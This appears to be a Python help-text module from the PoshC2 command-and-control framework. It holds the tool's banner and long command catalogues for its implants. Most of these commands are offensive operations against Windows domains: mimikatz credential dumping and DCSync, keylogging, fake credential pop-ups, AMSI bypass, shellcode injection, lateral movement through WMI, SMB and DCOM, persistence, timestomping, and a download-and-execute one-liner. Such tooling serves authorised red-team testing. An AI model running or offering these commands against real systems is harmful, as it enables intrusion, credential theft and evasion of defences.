import subprocess, traceback

from poshc2 import VERSION
from poshc2.Colours import Colours
from poshc2.server.Core import print_bad

logopic = Colours.GREEN + r"""
                    _________            .__.     _________  ________
                    \_______ \____  _____|  |__   \_   ___ \ \_____  \\
                    |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/
                    |    |  (  <_> )___ \|   Y  \ \     \____/       \\
                    |____|   \____/____  >___|  /  \______  /\_______ \\
                                        \/     \/          \/         \/
"""

try:
    commit = subprocess.check_output(["git", "log", "-1", "--format='%h %ci'"]).decode().strip('\n').strip("'")[:-6]
    banner = Colours.GREEN + r"""          =============== PoshC2 %s (%s) ===============
""" % (VERSION, commit)
except Exception:
    banner = Colours.GREEN + r"""          =============== PoshC2 %s ===============
""" % VERSION

logopic = logopic + banner

py_help = """
* Implant Features:
====================
ps
startanotherimplant or sai
startanotherimplant-keepfile
beacon 60s / beacon 10m / beacon 2h
python print "This is a test"
loadmodule
loadmoduleforce
get-keystrokes
upload-file # then prompts for target and destination
upload-file -source /tmp/test.exe -destination 'c:\\temp\\test.exe'
download-file 'C:\\temp\\interesting-file.txt'
install-persistence
remove-persistence
get-screenshot
kill-implant
hide-implant
unhide-implant
help
searchhelp persistence
searchhistory invoke-mimikatz
back
label-implant <newlabel>
remove-label
linuxprivchecker
quit
"""

sharp_help = """
* Implant Features:
====================
ps
corehelp
beacon 60s / beacon 10m / beacon 2h
turtle 60s / turtle 30m / turtle 8h
pwd
enable-rotation
get-rotation
ls c:\\temp\\
ls-recurse c:\\temp\\
del
posh-delete c:\\temp\\test.exe
move c:\\temp\\old.exe c:\\temp\\new.exe
copy c:\\temp\\test.exe c:\\temp\\test.bac
get-content c:\\temp\\log.txt
get-userinfo
get-computerinfo
get-dodgyprocesses
sharpps get-process
pslo powerview.ps1
runas <user> <password> <os command> <domain> <timeout> <logontype>
runasps <domain> <user> <password> <ps command>
kill-process 1890
sslinspectioncheck https://www.google.com <proxyhost> <proxyuser> <proxypass> <useragent>
create-lnk c:\\users\\public\\test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
create-startuplnk test.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\test.dll,VoidFunc
resolveip 127.0.0.1
resolvednsname google.com
loadmodule Seatbelt.exe
loadmoduleforce
listmodules
ls-pipes
modulesloaded
run-exe Core.Program Core
run-dll Seatbelt.Program Seatbelt UserChecks
run-dll SharpSploit.Enumeration.Host SharpSploit GetHostname
run-dll SharpSploit.Enumeration.Host SharpSploit GetProcessList
run-exe-background Core.Program Core runmylongapp
run-dll-background Core.Program Core runmylongdll
start-process net users
start-shortcut c:\\users\\public\\image.lnk
download-file "c:\\temp\\test.exe"
upload-file -source /tmp/test.exe -destination "c:\\temp\\test.exe"
kill-implant
hide-implant
unhide-implant
help
inveigh
stopinveigh
loadpowerstatus
getpowerstatus
stoppowerstatus
searchhelp listmodules
searchhistory invoke-mimikatz
label-implant <newlabel>
remove-label
bypass-amsi
sharpapplocker
sharpedrchecker
lockless WebCacheV01.dat
lockless WebCacheV01.dat /process:taskhostw /copy:C:\\Temp\\out.tmp
quit
back

* Running PS
=============
sharpps $psversiontable
pslo powerview.ps1

* Migration
============
migrate
inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoof>
inject-shellcode <pid>

* Privilege Escalation:
========================
arpscan 172.16.0.1/24 true
get-serviceperms c:\\temp\\
get-screenshot
get-screenshotmulti 2m
stop-screenshotmulti
get-screenshotallwindows
start-keystrokes
start-keystrokes-writefile
get-keystrokes
stop-keystrokes
testadcredential domain username password
testlocalcredential username password
cred-popper "Outlook" "Please Enter Your Domain Credentials"
cred-popper "Putty" "Please re-enter your OTP code" "root@172.16.0.1"
get-hash
sharpup
sharpweb all
seatbelt -group=all
seatbelt -group=chrome
seatbelt -group=misc
watson
sharpcookiemonster
sharpdpapi machinetriage
sharpchrome logins
sweetpotato -p c:\\users\\public\\startup.exe

* Process Dumping:
===================
safetydump
safetydump <pid>
safetykatz minidump
safetykatz full

* Mimikatz via SharpSploit:
============================
mimikatz Wdigest
mimikatz LsaSecrets
mimikatz LsaCache
mimikatz SamDump
mimikatz Command "privilege::debug sekurlsa::logonPasswords"

* Network Tasks:
=================
rubeus kerberoast
rubeus asreproast /user:username
sharpview Get-NetUser -SamAccountName ben
sharpview Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -Recurse
sharpview Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
sharpview Get-NetUser -Name deb -Domain blorebank.local
sharpview Get-NetSession -Domain blorebank.local
sharpview Get-NetOU -Properties distinguishedname
sharpview Get-DomainController -Domain blorebank.local
sharpview Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
sharpview Get-DomainUser -AdminCount -Properties samaccountname
sharpview Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
sharpview Get-DomainComputer -SearchBase "OU=Domain Controllers,DC=contoso,DC=local" -Properties samaccountname
sharpview Get-NetShare -ComputerName SERVER01
sharpwmi action=query query="select * from win32_process"
sharpwmi action=query query="select * from win32_process where name='explorer.exe'" computername=SERVER01,SERVER02
sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
sharpwmi action=query query="select * from win32_process" computername=SERVER01 username=DOMAIN\\user password=Password123!
sharpwmi action=query query="select * FROM AntiVirusProduct" namespace="root\\SecurityCenter2"
getremoteprocesslisting SERVER01 explorer.exe
getremoteprocesslisting SERVER01,SERVER02,SERVER03 taskhost.exe
getremoteprocesslistingall SERVER01,SERVER02
portscan "10.0.0.1-50" "1-65535" 1 100 # <hosts> <ports> <delay-in-seconds> <max-threads>
standin --asrep
standin --spn
standin --delegation
standin --dc
standin --group "Domain Admins"
standin --object samaccountname=DC$

* Lateral Movement:
====================
sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
wmiexec -t 10.0.0.1 -u admin -d domain -p password1 -c "rundll32 c:\\users\\public\\run.dll,etp"
smbexec -t 10.0.0.1 -u admin -d domain -h <nthash> -c "rundll32 c:\\users\\public\\run.dll,etp"
dcomexec -t 10.0.0.1 -m mmc -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
dcomexec -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
sharpsc SERVER01 service "cmd /c rundll32.exe test.dll,Ep" domain username password
pbind-connect hostname
pbind-connect hostname <pipename> <secret>
fcomm-connect
fcomm-connect filepath

* Lateral Movement with Pre-Built Payload:
===========================================
sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
startdaisy
stopdaisy

* Socks:
=========
sharpsocks
stopsocks
run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -url2 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -c raFAdgVujTHBwcvMuRFYgKHqp -k fFaKiMspoTWHPbu3PvUNvpzTkuq+VKDp+h1X79q3gXQ= -s https://10.10.10.1 -b 5000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken

* Bloodhound:
==============
sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,RDP,DCOM,PSRemote,DCOnly --outputdirectory c:\\users\\public --nosavecache --RandomizeFilenames --zipfilename backup_small.zip --collectallproperties
sharphound -c Container,Group,LocalGroup,GPOLocalGroup,ObjectProps,ACL,Trusts,RDP,DCOM,PSRemote,Session,LoggedOn,Default --outputdirectory c:\\users\\public --nosavecache --RandomizeFilenames --zipfilename backup_full.zip --collectallproperties

* Run Generic C# Executable:
=============================
# See Alias.py for examples or to add your own aliases
loadmodule MyBinary.exe
run-exe <FullyQualifiedClassWithMainMethod> <MyBinaryAssemblyName>

* Dynamically compile and run code on the target:
=================================================
# Edit payloads/DynamicCode.cs then:
dynamic-code
dynamic-code <args>

"""

posh_help = """
* Implant Features:
=====================
ps
invoke-urlcheck -urls https://api.hsbc.com,https://d36xb1r83janbu.cloudfront.net -domainfront d2argm04ypulrn.cloudfront.net,d36xb1r83janbu.cloudfront.net -uri /en-gb/surface/accessories/
searchhelp mimikatz
searchhistory invoke-mimikatz
label-implant <newlabel>
remove-label
get-hash
enable-rotation
get-rotation
unhidefile
hidefile
get-ipconfig
netstat
beacon 60s / beacon 10m / beacon 2h
turtle 60s / turtle 30m / turtle 8h
kill-implant
hide-implant
unhide-implant
loadpowerstatus
get-proxy
get-computerinfo
unzip <source file> <destination folder>
get-system
get-implantworkingdirectory
get-pid
posh-delete c:\\temp\\svc.exe
get-webpage http://intranet
listmodules
modulesloaded
loadmodule <modulename>
loadmodule inveigh.ps1
loadmoduleforce inveigh.ps1
get-userinfo
invoke-hostenum -all
find-allvulns
invoke-expression (get-webclient).downloadstring("https://module.ps1")
startanotherimplant or sai
startdaisy
invoke-daisychain -daisyserver http://192.168.1.1 -port 8899 -c2port 443 -c2server https://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\\test -proxypassword pass -localhost (optional if low level user)
createproxypayload -user <dom\\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>
get-mshotfixes
get-firewallrulesall | out-string -width 200
enablerdp
disablerdp
netsh.exe advfirewall firewall add rule name="enablerdp" dir=in action=allow protocol=tcp localport=any enable=yes
get-wlanpass
get-wmiobject -class win32_product
get-creditcarddata -path 'c:\\backup\\'
timestomp c:\\windows\\system32\\service.exe "01/03/2008 12:12 pm"
icacls c:\\windows\\system32\\resetpassword.exe /grant administrator:f
create-shortcut -sourceexe "c:\\windows\\notepad.exe" -argumentstosourceexe "" -destinationpath "c:\\users\\public\\notepad.lnk"
get-allfirewallrules c:\\temp\\rules.csv
get-allservices
get-wmireglastloggedon
get-wmiregcachedrdpconnection
get-wmiregmounteddrive
resolve-ipaddress
get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`nAMSI Loaded`n"} }
get-wmiObject -class win32_product

* Privilege Escalation:
====================
invoke-allchecks
Invoke-PsUACme -Payload "c:\\temp\\uac.exe" -method sysprep
get-mshotfixes | where-object {$_.hotfixid -eq "kb2852386"}
invoke-ms16-032
invoke-ms16-032-proxypayload
invoke-eternalblue -target 127.0.0.1  -initialgrooms 5 -maxattempts 1 -msfbind
get-gpppassword
get-content 'c:\\programdata\\mcafee\\common framework\\sitelist.xml'
dir -recurse | select-string -pattern 'password='

* File Management:
=================
download-file -source 'c:\\temp dir\\run.exe'
download-files -directory 'c:\\temp dir\\'
upload-file -source 'c:\\temp\\run.exe' -destination 'c:\\temp\\test.exe'
web-upload-file -from 'http://www.example.com/app.exe' -to 'c:\\temp\\app.exe'

* Persistence (with powershell.exe):
====================================
install-persistence 1,2,3
remove-persistence 1,2,3
install-servicelevel-persistence
remove-servicelevel-persistence
invoke-wmievent -name backup -command "powershell -enc abc" -hour 10 -minute 30
get-wmievent
remove-wmievent -name backup

* Persistence:
=============
installexe-persistence
removeexe-persistence

* Network Tasks / Lateral Movement:
==================================
get-externalip
test-adcredential -domain test -user ben -password password1
invoke-smblogin -target 192.168.100.20 -domain testdomain -username test -hash/-password
invoke-smbclient -Action Put -source c:\\temp\\test.doc -destination \\test.com\\c$\\temp\\test.doc -hash
invoke-smbexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
invoke-wmiexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
net view | net users | net localgroup administrators | net accounts /dom
whoami /groups | whoami /priv

* Active Directory Enumeration:
==================
invoke-aclscanner
invoke-aclscanner | Where-Object {$_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
get-objectacl -resolveguids -samaccountname john
add-objectacl -targetsamaccountname arobbins -principalsamaccountname harmj0y -rights resetpassword
get-netuser -admincount | select samaccountname
get-netuser -uacfilter not_accountdisable -properties samaccountname,pwdlastset
get-domainuser -uacfilter not_password_expired,not_accountdisable -properties samaccountname,pwdlastset | export-csv act.csv
get-netgroup -admincount | select samaccountname
get-netgroupmember "domain admins" -recurse|select membername
get-netcomputer | select-string -pattern "citrix"
get-netcomputer -filter operatingsystem=*7*|select name
get-netcomputer -filter operatingsystem=*2008*|select name
get-netcomputer -searchbase "LDAP://OU=Windows 2008 Servers,OU=ALL Servers,DC=poshc2,DC=co,DC=uk"|select name
get-netcomputer -domaincontroller internal.domain.com -domain internal.domain.com -Filter "(lastlogontimestamp>=$((Get-Date).AddDays(-30).ToFileTime()))(samaccountname=UK*)"|select name,lastlogontimestamp,operatingsystem
get-domaincomputer -ldapfilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -spn "wsman*" -properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
get-netgroup | select-string -pattern "internet"
get-netuser | select-object samaccountname,userprincipalname
get-netuser -filter samaccountname=test
get-netuser -filter userprinciplename=test@test.com
get-netgroup | select samaccountname
get-netgroup "*ben*" | select samaccountname
get-netgroupmember "domain admins" -recurse|select membername
get-netshare hostname
invoke-sharefinder -verbose -checkshareaccess
new-psdrive -name "p" -psprovider "filesystem" -root "\\\\bloredc1\\netlogon"

* Domain Trusts:
==================
get-netdomain | get-netdomaincontroller | get-netforestdomain
get-netforest | get-netforesttrust
invoke-mapdomaintrust
get-netuser -domain child.parent.com -filter samaccountname=test
get-netgroup -domain child.parent.com | select samaccountname

* Domain / Network Tasks:
==================
invoke-bloodhound -collectionmethod stealth
get-netdomaincontroller | select name | get-netsession | select *username,*cname
get-dfsshare | get-netsession | select *username,*cname
get-netfileserver | get-netsession | select *username,*cname
invoke-kerberoast -outputformat hashcat|select-object -expandproperty hash
get-domaingpouserlocalgroupmapping -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
get-domaingpouserlocalgroupmapping -LocalGroup RDP -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
write-scffile -ipaddress 127.0.0.1 -location \\\\localhost\\c$\\temp\\
write-inifile -ipaddress 127.0.0.1 -location \\\\localhost\\c$\\temp\\
get-netgroup | select-string -pattern "internet"
invoke-hostscan -iprangecidr 172.16.0.0/24 (provides list of hosts with 445 open)
get-netfileserver -domain testdomain.com
find-interestingfile -path \\\\server\\share -officedocs -lastaccesstime (get-date).adddays(-7)
get-netlocalgroupmember -computername host1 -groupname administrators| select membername
brute-ad
brute-locadmin -username administrator
get-passpol
get-passnotexp
get-locadm
invoke-inveigh -http y -proxy y -nbns y -tool 1 -StartupChecks y
get-inveigh
stop-inveigh
invoke-sniffer -outputfile c:\\temp\\output.txt -maxsize 50mb -localip 10.10.10.10
invoke-sqlquery -sqlserver 10.0.0.1 -user sa -pass sa -query 'select @@version'
invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
runas-netonly "domain" "username" "password" "ls \\\\mydc\\c$"
invoke-pipekat -target <ip-optional> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>

* Lateral Movement - powershell.exe:
=========================================================
invoke-runaspayload -user <user> -password '<pass>' -domain <dom> -credid <credid-optional>
invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional> -credid <credid-optional>
invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -credid <credid-optional>
invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass> -credid <credid-optional>
invoke-dcompayload -target <ip>

* Lateral Movement - shellcode:
=========================================================
invoke-wmijspayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -credid <credid-optional>

* Credentials / Tokens / Local Hashes (Must be SYSTEM):
=========================================================
invoke-mimikatz -command '"sekurlsa::logonpasswords"'
invoke-mimikatz -command '"privilege::debug" "lsadump::sam"'
invoke-mimikatz -command '"privilege::debug" "lsadump::lsa"'
invoke-mimikatz -command '"privilege::debug" "lsadump::cache"'
invoke-mimikatz -command '"privilege::debug" "lsadump::secrets"'
invoke-mimikatz -command '"ts::multirdp"'
invoke-mimikatz -command '"privilege::debug"'
invoke-mimikatz -command '"crypto::capi"'
invoke-mimikatz -command '"crypto::certificates /export"'
invoke-mimikatz -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
invoke-tokenmanipulation | select-object domain, username, processid, iselevated, tokentype | ft -autosize | out-string
invoke-tokenmanipulation -impersonateuser -username "domain\\user"
get-lapspasswords

* Credentials / Domain Controller Hashes:
============================================
invoke-mimikatz -command '"lsadump::dcsync /domain:domain.local /user:administrator"'
invoke-dcsync -pwdumpformat
dump-ntds -emptyfolder <emptyfolderpath>

* Useful Modules:
====================
get-screenshot
get-screenshotallwindows
get-screenshotmulti -timedelay 120 -quantity 30
get-recentfiles
cred-popper
get-clipboard
hashdump
get-keystrokes
get-keystrokedata
arpscan -ipcidr 10.0.0.1/24
portscan -hosts 10.0.0.1-50 -ports "1-65535" -threads 10000 -delay 0
get-netstat | %{"$($_.Protocol) $($_.LocalAddress):$($_.LocalPort) $($_.RemoteAddress):$($_.RemotePort) $($_.State) $($_.ProcessName)($($_.PID))"}
migrate
migrate -procid 4444
migrate -procpath c:\\windows\\system32\\searchprotocolhost.exe -suspended -RtlCreateUserThread
migrate -procpath c:\\windows\\system32\\svchost.exe -suspended
inject-shellcode -x86 -procid 5634 -parentId 1111
inject-shellcode -x64 -parentId 1111 -procpath 'c:\\windows\\system32\\svchost.exe' -suspended
get-injectedthread
get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
stopsocks
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\\windows\\system32\\svchost.exe" protocol=TCP localport=80 profile=Domain
reversedns 10.0.0.1
invoke-edrchecker
invoke-edrchecker -force
invoke-edrchecker -remote <hostname>
invoke-edrchecker -remote <hostname> -ignore

* PS Commands:
===============
((new-object Net.Sockets.TcpClient).connect("10.0.0.1",445))
1..254 | %{ try {[System.Net.Dns]::GetHostEntry("10.0.0.$_") } catch {} }|select hostname
[System.Net.Dns]::GetHostbyAddress("10.0.0.1")
$socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.start();


* Implant Handler:
====================
searchhelp payload
searchhistory pushover
back
quit
exit
"""


server_help = """
* Main Menu:
================================
* use implant by <id>, e.g. 1
* use multiple implants by <id>,<id>,<id>, e.g. 1,2,5
* use implant by range, e.g. 40-45
* use all implants by all

* Auto-Runs:
=====================
add-autorun <task>
list-autorun (alias: l)
del-autorun <taskid>
nuke-autorun

* Hosted-Files:
====================
show-hosted-files
add-hosted-file
disable-hosted-file
enable-hosted-file

* Server Commands:
=====================
tasks
opsec
get-opsec-events
add-opsec-event
del-opsec-event
show-urls
list-urls
cleartasks
show-serverinfo
message "Message to broadcast"
history
generate-reports
generate-csvs
set-pushover-applicationtoken df2
set-pushover-userkeys 44789
set-slack-userid UHEJYT2AA
set-slack-channel #bots
set-slack-bottoken xobo-
set-defaultbeacon 60
get-killdate
set-killdate 22/10/2019
turnon-notifications
turnoff-notifications
listmodules
pwnself (alias: p)
creds
creds -add -domain=<domain> -username=<username> -password='<password>'/-hash=<hash>
creds -search <username>
createnewpayload
createnewshellcode
createproxypayload
createdaisypayload
quit
kill
"""

special_characters = "!@#$%^&*()+=."


def build_help(help_string):
    commands = []
    for line in help_string.splitlines():
        try:
            line = line.strip()
            if line:
                entry = line.split(None, 1)[0]
                if entry not in commands and not any(char in special_characters for char in entry):
                    commands.append(entry)
        except Exception:
            print_bad("Error building help")
            traceback.print_exc()
    commands.sort()
    return commands


SERVER_COMMANDS = build_help(server_help)
POSH_COMMANDS = build_help(posh_help)
PY_COMMANDS = build_help(py_help)
SHARP_COMMANDS = build_help(sharp_help)
